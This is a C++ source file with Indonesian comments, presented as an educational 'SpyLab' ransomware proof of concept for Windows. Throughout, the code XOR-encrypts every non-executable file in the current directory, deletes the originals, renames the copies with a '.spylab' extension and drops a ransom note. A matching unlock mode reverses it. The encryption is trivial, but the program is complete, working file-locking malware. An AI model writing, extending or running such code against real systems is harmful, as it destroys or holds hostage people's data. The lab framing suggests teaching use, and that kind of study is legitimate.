#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>
#include <iomanip>

using namespace std;

// Konfigurasi Lab
const char XOR_KEY = 0x69; // Ganti kunci sesukamu (1 byte)
const string EXTENSION = ".spylab";
const string RANSOM_NOTE = "README_WARNING.txt";

// Fungsi untuk Enkripsi/Dekripsi (XOR itu reversible)
void ProcessFile(string filePath, bool isLocking) {
    // Baca file secara binary
    ifstream inFile(filePath, ios::binary);
    if (!inFile) return;

    vector<char> buffer((istreambuf_iterator<char>(inFile)), (istreambuf_iterator<char>()));
    inFile.close();

    // Proses XOR pada setiap byte
    for (size_t i = 0; i < buffer.size(); i++) {
        buffer[i] ^= XOR_KEY;
    }

    // Tentukan nama file baru
    string newPath;
    if (isLocking) {
        newPath = filePath + EXTENSION;
    } else {
        newPath = filePath.substr(0, filePath.find(EXTENSION));
    }

    // Tulis kembali ke file baru
    ofstream outFile(newPath, ios::binary);
    outFile.write(buffer.data(), buffer.size());
    outFile.close();

    // Hapus file lama setelah berhasil diproses
    remove(filePath.c_str());
    cout << (isLocking ? "[LOCKED] " : "[UNLOCKED] ") << filePath << " -> " << newPath << endl;
}

void CreateNote(string dir) {
    ofstream note(dir + "\\" + RANSOM_NOTE);
    note << "========================================" << endl;
    note << "   SPY-LAB EDUCATIONAL PROJECT 2026     " << endl;
    note << "========================================" << endl;
    note << "Semua file di folder ini telah di-XOR." << endl;
    note << "Gunakan mode 'unlock' untuk mengembalikan." << endl;
    note.close();
}

int main(int argc, char* argv[]) {
    // Keamanan: Harus jalankan lewat CMD dengan argumen
    if (argc < 2) {
        cout << "Usage: SpyLab_PoC.exe <lock|unlock>" << endl;
        return 1;
    }

    string mode = argv[1];
    char path[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, path);

    cout << "Target Directory: " << path << endl;
    cout << "Mode: " << mode << "\n--------------------------" << endl;

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA("*", &fd);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            string fileName = fd.cFileName;

            // Jangan kunci file program sendiri, file sistem, atau catatan tebusan
            if (fileName == "." || fileName == ".." || fileName.find(".exe") != string::npos || fileName == RANSOM_NOTE) {
                continue;
            }

            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                if (mode == "lock" && fileName.find(EXTENSION) == string::npos) {
                    ProcessFile(fileName, true);
                } 
                else if (mode == "unlock" && fileName.find(EXTENSION) != string::npos) {
                    ProcessFile(fileName, false);
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    if (mode == "lock") CreateNote(path);
    
    cout << "--------------------------\nProses Selesai, Bos!" << endl;
    return 0;
}
